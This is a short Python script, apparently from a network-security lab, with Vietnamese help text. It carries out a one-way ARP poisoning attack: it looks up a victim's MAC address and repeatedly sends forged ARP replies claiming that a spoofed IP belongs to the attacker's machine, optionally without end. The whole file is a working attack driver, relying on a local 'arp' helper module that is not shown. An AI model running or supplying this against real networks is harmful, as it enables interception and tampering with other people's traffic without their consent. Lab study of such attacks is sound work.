#!/usr/bin/env python3
import argparse

from arp import iface_info, mac_to_str, resolve_mac, send_arp_reply


def main():
    parser = argparse.ArgumentParser(description="Kịch bản 1: poison ARP một chiều tới User")
    parser.add_argument("--iface", default="eth0")
    parser.add_argument("--victim", default="10.11.1.10", help="IP máy nạn nhân")
    parser.add_argument("--spoof", default="10.11.1.20", help="IP bị giả mạo")
    parser.add_argument("--count", type=int, default=30, help="0 = gửi liên tục")
    parser.add_argument("--interval", type=float, default=1.0)
    args = parser.parse_args()

    ip, mac = iface_info(args.iface)
    print("[*] Attacker: %s  MAC %s" % (ip, mac_to_str(mac)))
    victim_mac = resolve_mac(args.iface, args.victim)
    print("[*] Nạn nhân: %s  MAC %s" % (args.victim, mac_to_str(victim_mac)))
    print("[*] Bắt đầu poison: nói với %s rằng %s nằm tại MAC của Attacker" %
          (args.victim, args.spoof))
    send_arp_reply(args.iface, args.spoof, args.victim, victim_mac,
                   count=args.count, interval=args.interval)


if __name__ == "__main__":
    main()
